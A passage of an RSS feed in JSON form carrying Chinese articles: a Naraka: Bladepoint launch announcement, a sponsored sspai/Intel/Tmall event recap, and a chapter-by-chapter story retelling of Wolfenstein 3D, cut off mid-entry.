Zhang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/399179777?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"游戏《永劫无间》8 月 12 日全面开服，游戏体验如何？","date":"2021-08-12 11:30:22","description":"\n<p>我们在8/12正式全球开启了永劫无间公测，Steam的玩家久等了！</p>\n<p>公测版本您可以体验到的和6月Steam测试的差异内容，我简单介绍一下：</p>\n<p><b>1）新英雄：</b>妖刀姬。攻击能力著称，以豪快的巨型妖刀进行砍劈。</p>\n<p><b>2）新武器：</b>匕首，万刃轮。近战武器匕首，神出鬼没，可以借由闪步发动快速的扑杀或撤收。金色飓风客的万刃轮，则是正面突破神器，提供单纯高速冲刺的快乐。</p>\n<p><b>3）新机制：</b>宝窟。在战场听到蛙鸣声时，留意四周，取得金蟾蜍带着的钥匙就可以开启宝库！</p>\n<p><b>4）新模式：</b>快速匹配。如果您觉得段位排名很费力，只想休闲一下涨涨经验，快速匹配满足您的需求。</p>\n<p><b>5）局外功能：</b>亲密度，为您和好友的组队获取更高回报；快速匹配，解决孤狼想找同伴的困扰。</p>\n<p><b>6）商品：</b>聚宝阁（抽箱），隐族秘宝（赛季bp），幻丝商城。</p>\n<p><b>7）福利：</b>初启征程（14天）为新手提供了贴心奖励；传火则让您与好友获得更多馈赠。</p>\n<p><b>8）其他：</b>展示台，让您自己编辑展示画面的英雄展现。</p>\n<p><b>9）调整：</b>天赋改为英雄修行解锁，不再消耗古币。灼烧造成减疗。各种英雄和武器平衡调整。自定义新增各种选项。</p>\n<p><br></p>\n<p>在服务器策略上我们努力满足大家的需求。作为极少的有版号的登录STEAM且在海外有可观玩家数的国产联机游戏，我们做了许多方案探索，最终通过各种争取与妥协确认了当前的服务器策略，希望各位玩家理解。</p>\n<p>后续我们还将持续推出各类新内容，并对现有内容不断进行优化调整。感谢各位对《永劫无间》的支持！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/rayk888?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Ray Kuan</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/479024078/answer/2055822769?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">181 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/470628028?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《永劫无间》这款游戏值得玩吗？</a><br><a href=\"http://www.zhihu.com/question/361077302?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 24 Entertainment 研发的游戏《永劫无间》?</a><br>\n","link":"http://www.zhihu.com/question/479024078/answer/2055822769?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"成就更多少数派，极客好物体验线下回顾","date":"2021-08-12 10:22:57","description":"\n<p>作为一个数码领域的老极客，这些年还是积累了一些不错的收藏，而这些设备背后，连接着每一个科技节点的人和事，每当有朋友来到办公室，都会在这些老设备面前驻足观赏，勾起大家的往日回忆，我也会跟他们讲讲幕后故事，瞬间就拉近了彼此的距离。</p>\n<p>所以我一直想找机会办一个线下展览，让更多少数派用户也能感受科技时代的魅力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/ec45dfc8aacf8e49cccdb523df4404db.jpg\"></figure><h2>与 Intel 和天猫同好派共同发起</h2>\n<p>Intel 作为拥有 50 多年历史的芯片厂商，推动了科技史的发展历程，酷睿芯片系列产品更是跟我们的工作生活紧密相关，但演进到今天的移动互联网时代，intel 希望能了解年轻人对芯片的认知和理解。</p>\n<p>刚好，一直专注 95 后兴趣营销的天猫同好派，暑期联合 intel 酷睿打造了次世代极客计划，也在寻找这样的线下活动机会。我仔细研究了一下，发现双方还真有很多共同之处，首先是我们的 Logo 都有一个派，少数派是构建一个内容闭环，同好派则是在天猫市场部专注95后圈层兴趣营销。少数派的 Slogan 是高效工作和品质生活，同好派的 Slogan 是共同打造年轻人的理想生活方式，基于这些契合点，我们共同发起了这次极客好物分享体验会。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/67861d3f011a4342651af1f063d38ff9.jpg\"></figure><p>有了少数派的老收藏老故事，我们还需要新时代的观点碰撞，于是，这次的分享嘉宾，并没有按照惯例邀请圈内人，而是跨圈层的找到了科技、艺术、游戏、音乐领域的四个 95 后年轻人，而我也变成了一个学习者的身份，去感受次世代人群的思想和风格，让我也瞬间年轻了 15 岁。</p>\n<h2>不要再制造垃圾产品</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/a5213b6f2b817c0b8faf1ede47c5657d.jpg\"></figure><p>第一个嘉宾谷逍驰是 Dexta Robotics 创始人兼 CEO，是我派的用户也是客户，他两年前打造的感知手套，希望打破虚拟与现实的交互边界，应该说就是《少数派报告》中的操控手套的真实版本，在 AR 仍然没有普及的时代，这个手套已经在思考下一个时代的交互形态。而这一次，他分享了更高维度的产品理解，从一个产品研发，推演一个行业和社会发展的紧密关系，同时希望在新的时代里，产品人可以从用户价值出发，不要在为了资本和规模去制造“垃圾产品”。</p>\n<h2>玩艺术不都是吃干饭的</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/b79f794ffcc3c1bb4a29e40c365fd18c.jpg\"></figure><p>第二个分享的佘璐芸，是一个在深圳长大的独立艺术人，从她的分享中能看到很多深圳文化的特质，比如不会轻易接受传统的艺术教导，有自己独立的思考和认知，为什么玩艺术都只能吃干饭？于是她将艺术融入到深圳特有的电子制造能力中，打造了一系列引起广泛共鸣的艺术作品，在电商平台展示她的作品现代艺术驱动器、2020 并不存在，同时获得再创作的基础。她同时也是一名纹身师和乐队鼓手。独立、真实、跨界、脑洞大开，让我们重新认知了 95 后的态度。</p>\n<h2>喜欢就去做，犹豫不能解决问题</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/27f3a8f702cb2d244d7d8d2de33a3391.jpg\"></figure><p>随后我们来到了游戏领域的李欣然，尽管依然是求学阶段，却已经设计完成了三款游戏作品，并且在多次获奖。虽然她开始只会美术这部分，但不妨碍她因为兴趣去学习策划和开发。第一款游戏《地域污染》要求玩家通过乱丢垃圾来毁灭世界，达成游戏胜利。用一种反讽的方式，来提醒人们深刻理解垃圾处理和环保意识。95 后有自己表达态度的方式，甚至可以动手完成一切，没什么需要犹豫的，既然喜欢，就先做了再说。</p>\n<h2>音乐需要设备，更需要了解自己</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/21cad207f2b0514e9177252d026283a1.jpg\"></figure><p>最后，我们请到了一个音乐人，写猫歌的姐姐 JE ZHANG，B 站知名 UP 主十个小张，又是一个人创作音乐，而且是任何场景下的自由表达，但也就是这种真实的形式，获得了更多年轻人的共鸣，一首《小张》倾诉了年轻人对于职场规则的无奈，专辑《猫歌五首》更是生动的展现了与猫相伴的奇妙日常。非常巧合的是，十个小张跟我一样，都是基于设备能力的升级，对自己的创作和创业，都产生转折。当然，这些设备都是可以随手在天猫这样的平台找到。</p>\n<h2>基于芯片和互联网的次世代，将成就更多少数派</h2>\n<p>这也正是少数派一直探索的话题，基于芯片技术和互联网带来的各种各样的产品，到底如何改变着我们的生活？就像我从中医专业转到出口贸易，因为一部 Palm650 手机，建立互联网社区，随后创业过程中的生产力工具 ThinkPad 电脑，甚至到品质生活阶段的智能电动汽车 Model Y，他们都是来自于 intel 酷睿体系的支持，虽然我们大多数人都没有刻意感知这些，但这个时代已经建立在芯片和网络之上了，就像上一个时代的水电煤一样，没有人可以离开它们。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/12/717f7d7de5aee41316e9922baf4bafb9.jpg\"></figure><p>而新时代的年轻人们，正在这个舞台上充分的展现自己，释放每个人心中的个性表达，我们也希望跟他们共同成长。不管是提供底层计算能力的 Intel 酷睿，还是基于互联网的品牌购物的天猫平台，将会为次世代的极客年轻人，提供理想生活的优质基础。而天猫同好派、Intel酷睿与少数派，也希望洞察不同领域的年轻人，一起构建成就他们的桥梁。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68231"},{"title":"《德军总部》系列到底讲了一个什么故事？","date":"2021-08-11 03:00:32","description":"\n<p>大名鼎鼎的《德军总部》相信不少玩家都很熟悉，年轻的玩家一般是从贝塞斯达发行的《德军总部：新秩序》和《德军总部：新巨像》最先接触的，年长一些的是从2009年动视发行的《德军总部》开始玩的，或者是更早一些的《重返德军总部》，一般只有那些游戏老炮们才玩过30年前的原版《德军总部3D》。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-245b25c76f54ee3d0cdd58de4fa6ef48_720w.png?rss\" data-caption=\"《德军总部》系列发展中游戏主角B.J. Blazkowicz形象的改变，第一格为92年《德军总部3D》的版本，第二格是01年的《重返德军总部》，第三格是09年的《德军总部》，第四格为14年由《新秩序》开启的新系列\" data-size=\"normal\" data-rawwidth=\"1692\" data-rawheight=\"509\" data-watermark=\"original\" data-original-src=\"v2-245b25c76f54ee3d0cdd58de4fa6ef48\" data-watermark-src=\"v2-376c417814d7f77e4feeedfced115209\" data-private-watermark-src=\"\"></p>\n<p>1992年，游戏开发商id Software推出的《德军总部3D (Wolfenstein 3D)》震惊了世界，约翰·卡马克、约翰·罗梅罗与他们的id工作室名声大噪，后来他们推出的《毁灭战士 | DOOM》系列更是深刻的改变了游戏史。对于《DOOM》系列大家了解的应该比较多，我在之前的文章中也详细讲过《DOOM》、《DOOM II》、《Final DOOM》、《DOOM 64》以及《DOOM 3》的全部剧情故事。</p>\n<ul>\n<li><b><a href=\"https://zhuanlan.zhihu.com/p/123228033\" class=\"internal\">原汁原味！带你领略原版的《DOOM》、《DOOM II》和《Final DOOM》全部剧情</a></b></li>\n<li><b><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">原汁原味！带你领略《</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">NRFTL</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">》、《</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">DOOM 64</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">》和《</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">DOOM 3</a><a href=\"https://zhuanlan.zhihu.com/p/158780798\" class=\"internal\">》全部剧情</a></b></li>\n<li><b><a href=\"https://zhuanlan.zhihu.com/p/394933213\" class=\"internal\">原汁原味！带你领略老《德军总部3D》和《命运之矛》的全部剧情故事</a></b></li>\n</ul>\n<p>相对来说，大家对于老《德军总部》的关注度并不高，原因其实也很简单，就是用现在的眼光看老《德军总部》实在是太落后了。由于几乎是最早的FPS游戏，《德军总部3D》的画面非常简陋，画面分辨率低，没有地板天花板贴图，场景重复度高，实际上不是真3D（射线发射法），无法上下瞄准，要同时按住alt键才能左右平移……而且游戏的枪械只有3种，敌人种类也不丰富，最令人头疼的一点是没有地图，而游戏到处又看起来几乎都一样，因此需要不少时间在沉闷的迷宫中找路，堪称“迷路模拟器”。基于以上原因，我是不会推荐大家像我自己一样去玩上20多个小时的（加上后面会说到的资料片）。如果实在想玩，可以用ECWolf（类似GZDOOM），修复了很多我上面提到的问题。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a37470f0fc7f6ff842a10753e3fe1cf8_720w.png?rss\" data-caption=\"或许现在看起来很简陋，但92年大家见到时都会被这梦想中的游戏方式所折服，而且本作和你现在玩的FPS区别已经非常小了\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-a37470f0fc7f6ff842a10753e3fe1cf8\" data-watermark-src=\"v2-aec072053ab42e4ee4348aaafc58316b\" data-private-watermark-src=\"\"></p>\n<p>虽然不推荐大家亲自尝试《德军总部3D》，但对于想从头了解《德军总部》系列故事的玩家，我从《德军总部》里截出了最原汁原味的故事内容，并对全部文本进行了翻译，保证大家对于其中有趣的内容一点不落。注意，以下所有游戏中的截图均来自Steam上的版本，两款游戏也都可以在Steam上轻松买到。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c23f6f918685eb288b75242db961fea7_720w.png?rss\" data-caption=\"其实在《德军总部：新秩序》里也可以在主角睡觉的时候穿越到《德军总部3D》中游玩，《新巨像》中甚至还有专门的街机玩这个\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-c23f6f918685eb288b75242db961fea7\" data-watermark-src=\"v2-adb2d231c0b4b4a5fc2a433e4a9a680f\" data-private-watermark-src=\"\"></p>\n<p>另外，还想提一下大家关于该系列游戏可能存在的两个无伤大雅的误解，第一个是《德军总部3D》并非严格意义上的世界第一款第一人称游戏，只是那时最被大众所熟知的，当然这也并不影响其在FPS届的地位。第二个是该游戏系列并非id Software工作室最早原创，早在1981年《德军总部 | Castle Wolfenstein》就已发行，并在1984年推出续作《Beyond Castle Wolfenstein》，但两部作品都是俯视角潜入游戏，id工作室是购买的对方的版权。闲话够多了，正式开始看游戏吧。</p>\n<h2>·《德军总部3D (Wolfenstein 3D)》</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-ce8973903a2fa2a991cdbcb7707bb432_720w.jpeg?rss\" data-caption=\"《德军总部3D (Wolfenstein 3D)》的两款封面，Steam版本所用的为左侧版本\" data-size=\"normal\" data-rawwidth=\"1201\" data-rawheight=\"920\" data-watermark=\"original\" data-original-src=\"v2-ce8973903a2fa2a991cdbcb7707bb432\" data-watermark-src=\"v2-ac4c79fabaa48b634353abb907e39194\" data-private-watermark-src=\"\"></p>\n<p>不知道你玩《德军总部3D》第一关的时候有没有想过为什么我们会出现在监狱之中，如果你熟悉90年代游戏发行，或者看过我关于《DOOM》系列的文章，那么你很可能会猜到《德军总部3D》也有一本使用手册，如果你有兴趣，可以点击<b><a href=\"http://link.zhihu.com/?target=http%3A//www.abandonia.com/files/extras/23636_game_extra_1.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">下载</a></b>。其中第二页介绍头一章“逃出狼穴”的时候就列出了<b>至今的故事（The Story So Far）</b>：</p>\n<ul>\n<li><i>你是威廉·J·布拉斯科维奇，又称B.J.（William J. \"B.J.\" Blazkowicz），盟军间谍中的坏小子，专门执行终极行动。你的任务是潜入纳粹堡垒海尔汉默城堡（Castle Hollehammer），找出铁拳行动（Eisenfaust，Iron Fist）的计划书——纳粹建造完美军队的蓝图。有传言说，在海尔汉默城堡深处，恐怖的沙布斯（Schabbs）博士已经完美掌握了用死尸建造一支凶猛军队的技术。这怎么可能呢，如果不是过于变态，听起来也太荒唐了。但是，万一是真的呢？</i></li>\n<li><i>你没有机会查出真相了！你在准备拿取秘密计划书时被抓获，被带到了纳粹的监狱狼穴（Castle Wolfenstein）中接受审问并将最终被处决。现在，你已经被囚禁在城堡要塞下十二天了。就在你的牢房门外，坐着一个脖子很粗的纳粹守卫。那天早上之前，他协助一名党卫军牙医，或者是机械师准备电击你的扁桃体。你快要崩溃了！你在地板上颤抖着乞求用信息换取医疗救助。他伸手去拿钥匙，脸上露出胜利后得意洋洋的狞笑。他打开门——锁栓声回响在走廊中，门吱吱嘎嘎地开了。他犯了大错！</i></li>\n<li><i>你只在他膝盖上踢了一脚就让他倒在了地板上。你一边摆出自己版本的胜利动作，一边抢过他的刀很快结果了他。站在守卫倒地的尸体旁，你疯了似地抓过他的枪。你并不确定其他守卫有没有听到他低沉的尖叫声。在纳粹地牢的深处，你必须逃出去。刚才孤注一掷的行动已经注定了你的命运——要么逃出去，要么死。</i></li>\n</ul>\n<p><img src=\"https://pic2.zhimg.com/v2-b388934ff8a6f7b86b101caffe6cba60_720w.png?rss\" data-caption=\"游戏开场画面，紧紧衔接“至今的故事”\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-b388934ff8a6f7b86b101caffe6cba60\" data-watermark-src=\"v2-e5fd174077ef33aea3a32e6995fa380e\" data-private-watermark-src=\"\"></p>\n<p>初代的《德军总部3D》总共有六个章节，每个章节一般总共九关，外加一个隐藏关卡，每个章节的最后一关都是BOSS关卡。其实原本《德军总部3D》只有前三章，后三章是后来加入的前传关卡，名为“夜行任务（Nocturnal Missions）”。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7f260e97904debd4f0902ecf9356cf13_720w.jpeg?rss\" data-caption=\"《德军总部3D》选关画面\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-7f260e97904debd4f0902ecf9356cf13\" data-watermark-src=\"v2-a4cfe6195099294dc46f04b5da6e7a53\" data-private-watermark-src=\"\"></p>\n<h2>—第一章：逃出狼穴（Escape from Wolfenstein）</h2>\n<p>我们在每一关中的主要任务就是杀纳粹，找钥匙开门，然后去电梯前往下一层（或许是上一层）。同时，我们也可以收集纳粹的财宝，并在每一关中寻找秘密地点。最后一关的关底BOSS为Hans Grosse，手持两把链式机枪。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1cca2a317923fe9f5bdc315584daac81_720w.png?rss\" data-caption=\"第一章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-1cca2a317923fe9f5bdc315584daac81\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>干掉BOSS拿到金钥匙之后，我们逃出了狼穴，看得到外面的蓝天青草地，伴随着镜头一转，我们能正面看到兴奋的B. J.一跃而起。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f28178755cd524cecde06288b562a36f_720w.png?rss\" data-caption=\"第一章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-f28178755cd524cecde06288b562a36f\" data-watermark-src=\"v2-d72a82c5637cd6eb51429ee88638b81b\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>你逃出了城堡，并与地下组织取得了联系。他们告诉你传言是真的：有人在海尔汉默城堡附近见过可怕的人体实验。所以，铁拳行动是真的！</b></li>\n<li><b>你必须去那，在疯狂的沙布斯博士反人类的不死军团出击之前消灭他！</b></li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-594006941dedbc0b1ff732bbf2e1d370_720w.png?rss\" data-caption=\"实际上这是游戏的宣传语，并非剧情内容\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-594006941dedbc0b1ff732bbf2e1d370\" data-watermark-src=\"v2-6e5b034b26a3f16a5ed639fea4e73096\" data-private-watermark-src=\"\"></p>\n<ul>\n<li>更多内容</li>\n<li>在第三章中，当第三帝国瓦解之时，希特勒藏在巨型地堡中。你的任务就是刺杀他，结束他的疯狂统治。</li>\n<li>如果你喜欢德军总部，你也同样会喜欢前传三部曲——夜行任务！拥有额外三十个激烈火爆、极具挑战的关卡！</li>\n</ul>\n<h2>—第二章：铁拳/艾森福斯特行动（Operation: Eisenfaust）</h2>\n<p>本章开始出现新的敌人——丧尸兵，最终的关底BOSS为沙布斯博士，投掷装满毒药的注射器进行攻击。将其击败之后，还能看到沙布斯博士的死亡画面重播，哈哈。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d2a1702d4f302785fec36046eb21cfa9_720w.png?rss\" data-caption=\"第二章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-d2a1702d4f302785fec36046eb21cfa9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5e09c0c1b146f692e9818cce56b5e725_720w.png?rss\" data-caption=\"第二章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-5e09c0c1b146f692e9818cce56b5e725\" data-watermark-src=\"v2-b052bc302cf9717040b1ec2bd0b5aad9\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>你站在沙布斯肥胖、邪恶、肿胀腐烂的身体旁，很高兴你的任务终于结束了。他所有的笔记和设备都会被摧毁。人类可以免受他可怕的变种人大军的伤害了。</b></li>\n<li><b>然而，纳粹的暴行还在继续：虽然纳粹战争机器正在垮台，仍有无数人被关进死亡集中营。只有一种方法可以阻止这种疯狂继续……</b></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-dcc2d152f365e67cac74023aaac0d478_720w.png?rss\" data-caption=\"只比上一章的宣传语多了一句话\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-dcc2d152f365e67cac74023aaac0d478\" data-watermark-src=\"v2-213c1fb557751c5f745fa8d7ded958bd\" data-private-watermark-src=\"\"></p>\n<ul>\n<li>任务：消灭希特勒 </li>\n<li>在第三章中，当第三帝国瓦解之时，希特勒藏在巨型地堡中。你的任务就是刺杀他，结束他的疯狂统治。你发现他逃到了国会大厦，你必须去那面对他。  </li>\n<li>如果你喜欢德军总部，你也同样会喜欢前传三部曲——夜行任务！拥有额外三十个激烈火爆、极具挑战的关卡！</li>\n</ul>\n<h2>—第三章：死吧，元首，死吧！（Die, Fuhrer, Die!）</h2>\n<p>本章秘密关卡非常有意思，我们可以看到《吃豆人》中的幽灵。由于幽灵是打不死的，只能跑，一边被其追逐，一遍过关，非常有意思。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-bf6c16a1a305a0a5364af2f9034906fe_720w.png?rss\" data-caption=\"吃豆人幽灵入侵德军总部\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-bf6c16a1a305a0a5364af2f9034906fe\" data-watermark-src=\"v2-8184a384885aa1b9138279e1def43d46\" data-private-watermark-src=\"\"></p>\n<p>关底BOSS为希特勒，总共有三种形态，一种是巫师形态（假希特勒），会发射火球，击败后会留下衣服逃脱重生，一种是机甲形态，装甲被击碎后，会脱下机甲，最终被击败后同样会有死亡回放。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fcab8d76f05157304e789779e765dab2_720w.png?rss\" data-caption=\"第一种形态一般认为是假希特勒，后两种才是真身\" data-size=\"normal\" data-rawwidth=\"128\" data-rawheight=\"64\" data-watermark=\"original\" data-original-src=\"v2-fcab8d76f05157304e789779e765dab2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8e7c5b37bfe384db995121dd2071b2a2_720w.png?rss\" data-caption=\"第三章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-8e7c5b37bfe384db995121dd2071b2a2\" data-watermark-src=\"v2-2560e4e9502aba1117ea21cf177d604e\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>恭喜！</b></li>\n<li><b>邪恶的绝对化身，阿道夫·希特勒，躺在你脚下他自己的血泊中。他那布满皱纹、满是鲜血的脸扭曲着，参差不齐的歪嘴似乎要哭嚎出来。死了也这么疯狂。你因惨胜嘴唇紧闭，一脚踢下他的头颅，朝着尸体啐了一口。</b></li>\n<li><b>万岁……呵。万你个鬼。</b></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-ddc628a5089ccef3985c1b0422d13d22_720w.png?rss\" data-caption=\"后三章的宣传——“但是，冒险才刚刚开始！”\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-ddc628a5089ccef3985c1b0422d13d22\" data-watermark-src=\"v2-c50f566478b5300a7b380c8cba31315a\" data-private-watermark-src=\"\"></p>\n<p>如果你喜欢德军总部，你也同样会喜欢前传三部曲——夜行任务！拥有额外三十个激烈火爆、极具挑战的关卡！B. J.在纳粹计划大规模化学战的时候与其作战。 与Otto Giftmacher，Gretel Grosse和Fettgesicht将军战斗吧！</p>\n<h2>—第四章：黑暗秘密（A Dark Secret）</h2>\n<p>后三章“夜行任务”一开始是单卖的，后来才和前三章整合到一起发行。秘密关卡可以通过潜行通过，关底BOSS为化学战的科学家Otto Giftmacher，会发射火箭炮，同样会有死亡回放。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6b4130b5269f5385fcab79d217d00ef2_720w.png?rss\" data-caption=\"第四章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-6b4130b5269f5385fcab79d217d00ef2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d31d51aa20889281a848d1f36e7a95de_720w.png?rss\" data-caption=\"第四章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-d31d51aa20889281a848d1f36e7a95de\" data-watermark-src=\"v2-8d0bd998e2aebfbe6990d9043bdb5e46\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>疯狂的Otto Giftmacher已经死了！</b></li>\n<li><b>化学战背后扭曲的科学家躺在你的脚下，但是他劳动果实长在了别的地方！第一波的化学战马上要来了。在重兵把守的埃尔兰根（Erlangen）堡垒中，存放着即将到来的毒药战争（Giftkrieg）的计划书。找出它们，你将得知从哪里找到这场致命袭击的领导——Fettgesicht将军。</b></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-2e2df15e4fb5e153459d9048c91d92c4_720w.png?rss\" data-caption=\"下一场冒险在等待！还等什么……开始下一场冒险，找到那些计划书！\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-2e2df15e4fb5e153459d9048c91d92c4\" data-watermark-src=\"v2-f9485925475a38629ee8c7315329e93e\" data-private-watermark-src=\"\"></p>\n<h2>—第五章：狂人踪迹（Trail of the Madman）</h2>\n<p>本章关底的BOSS是位女性——Gretel Grosse（整个游戏中的唯一女性），是第一章的BOSS的妹妹，攻击方式和他兄弟一样，被击败后不会有死亡回放。最后，镜头又会如第一章一样一转，看到兴奋的B. J.一跃而起。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b17cfef63533c416ef001f0d519a3201_720w.png?rss\" data-caption=\"第五章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-b17cfef63533c416ef001f0d519a3201\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4153e605bb236b378dea76e40bc934ef_720w.png?rss\" data-caption=\"第五章关底结束语\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-4153e605bb236b378dea76e40bc934ef\" data-watermark-src=\"v2-155fe6b9a905ce88fba41e18e5c355fb\" data-private-watermark-src=\"\"></p>\n<ul>\n<li><b>计划书在你手里了！</b></li>\n<li><b>女巨人Gretel Grosse倒下了。希望他的兄弟汉斯（Hans）对此别生气……</b></li>\n<li><b>现在冲向奥芬巴赫（Offenbach）的军事设施，在化学战致命、烧灼的云团杀死无数人之前阻止这场恐怖的袭击。只有你能做到，B. J.。</b></li>\n</ul>\n<p><img src=\"https://pic3.zhimg.com/v2-bb67f9551767eb869775db2f60684da2_720w.png?rss\" data-caption=\"终结将至！在Fettgesicht将军开始痛苦与毁灭的疯狂计划之前去干掉他！\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-bb67f9551767eb869775db2f60684da2\" data-watermark-src=\"v2-b585bc91d61ec19929238481695acd6b\" data-private-watermark-src=\"\"></p>\n<h2>—第六章：对抗（Confrontation）</h2>\n<p>本章秘密关卡中有所有类型的普通敌人，有三个第一章的BOSS——Hans Grosse（或许是他的兄弟们），甚至还有一个吃豆人的幽灵。关底BOSS为Fettgesicht将军，一边发射火箭炮，一边使用机枪，被击败后能看到死亡回放。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-cebd63220909de993df8609a596e2a83_720w.png?rss\" data-caption=\"第六章关底BOSS\" data-size=\"normal\" data-rawwidth=\"192\" data-rawheight=\"192\" data-watermark=\"original\" data-original-src=\"v2-cebd63220909de993df8609a596e2a83\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img 